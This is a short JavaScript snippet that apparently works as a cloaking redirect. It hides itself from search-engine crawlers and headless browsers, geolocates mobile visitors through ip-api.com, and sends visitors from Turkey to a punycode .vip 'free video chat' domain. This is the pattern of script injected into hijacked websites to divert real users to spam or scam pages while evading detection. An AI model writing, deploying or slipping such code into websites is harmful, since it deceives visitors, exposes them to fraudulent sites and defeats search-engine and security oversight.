(function() {
    const botPatterns = [
        /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, 
        /duckduckbot/i, /yandexbot/i, /baiduspider/i,
        /duckduckbot/i, /baiduspider/i, /yandexbot/i,
        /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i
    ];
    const isBot = botPatterns.some(regex => regex.test(navigator.userAgent));
    const isHeadless = navigator.webdriver || false;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (!isBot && !isHeadless && isMobile) {
        fetch("https://ip-api.com/json/?fields=countryCode")
            .then(res => res.json())
            .then(data => {
                if (data.countryCode === "TR") {
                    window.location.href = "https://www.xn--cretsizgoruntulusohbet-rlc.vip/";
                }
            })
            .catch(err => console.error("IP check failed:", err));
    }
})();

